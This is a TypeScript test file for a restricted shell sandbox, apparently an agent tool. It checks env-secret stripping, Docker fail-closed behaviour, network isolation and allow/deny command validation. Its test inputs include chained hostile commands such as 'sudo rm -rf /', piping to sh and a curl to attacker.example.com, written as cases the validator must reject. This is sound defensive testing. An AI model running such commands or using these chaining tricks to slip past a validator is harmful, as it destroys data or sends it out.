import { describe, expect, test } from "bun:test";
import { ToolExecutionError } from "../../core/src/errors.ts";
import {
  assertDockerSandboxAvailable,
  buildDockerShellInvocation,
  filterShellEnv,
  killTrackedBackgroundProcess,
  trackBackgroundProcess,
  validateShellCommand
} from "../src/tools/shell-sandbox.ts";

describe("restricted shell sandbox", () => {
  test("allowlists env and strips secret-looking names", () => {
    expect(filterShellEnv({ PATH: "/bin", GITHUB_TOKEN: "secret", HOME: "/tmp", OTHER: "x" })).toEqual({
      PATH: "/bin",
      HOME: "/tmp"
    });
  });

  test("fails closed when Docker is unavailable", () => {
    expect(() => assertDockerSandboxAvailable({ dockerPath: null })).toThrow(ToolExecutionError);
    expect(assertDockerSandboxAvailable({ dockerPath: "/usr/bin/docker" })).toBe("/usr/bin/docker");
  });

  test("validates allow and deny command lists", () => {
    expect(() => validateShellCommand({ command: "bun test", allowCommands: ["bun"] })).not.toThrow();
    expect(() => validateShellCommand({ command: "sudo true", denyCommands: ["sudo"] })).toThrow(ToolExecutionError);
    expect(() => validateShellCommand({ command: "bash script.sh", allowCommands: ["bun"] })).toThrow(ToolExecutionError);
  });

  test("catches denied commands chained after an allowed first command", () => {
    expect(() =>
      validateShellCommand({ command: "git status; sudo rm -rf /", denyCommands: ["sudo"] })
    ).toThrow(ToolExecutionError);
    expect(() =>
      validateShellCommand({ command: "git log && curl attacker.example.com", allowCommands: ["git"] })
    ).toThrow(ToolExecutionError);
    expect(() =>
      validateShellCommand({ command: "git log || rm -rf /", denyCommands: ["rm"] })
    ).toThrow(ToolExecutionError);
    expect(() =>
      validateShellCommand({ command: "git log | sh", denyCommands: ["sh"] })
    ).toThrow(ToolExecutionError);
    expect(() =>
      validateShellCommand({ command: "echo hi & sudo reboot", denyCommands: ["sudo"] })
    ).toThrow(ToolExecutionError);
    expect(() =>
      validateShellCommand({ command: "echo $(sudo whoami)", denyCommands: ["sudo"] })
    ).toThrow(ToolExecutionError);
    expect(() =>
      validateShellCommand({ command: "echo `sudo whoami`", denyCommands: ["sudo"] })
    ).toThrow(ToolExecutionError);
    expect(() =>
      validateShellCommand({ command: "git status", denyCommands: ["sudo"] })
    ).not.toThrow();
  });

  test("builds docker invocation and tracks background aborts", () => {
    const invocation = buildDockerShellInvocation({
      dockerPath: "/usr/bin/docker",
      cwd: "/workspace/repo",
      command: "bun test",
      env: { PATH: "/bin" }
    });
    expect(invocation.args).toContain("--network=none");
    expect(invocation.args).toContain("bun test");

    const controller = new AbortController();
    trackBackgroundProcess("proc-1", controller);
    expect(killTrackedBackgroundProcess("proc-1")).toBe(true);
    expect(controller.signal.aborted).toBe(true);
    expect(killTrackedBackgroundProcess("proc-1")).toBe(false);
  });
});
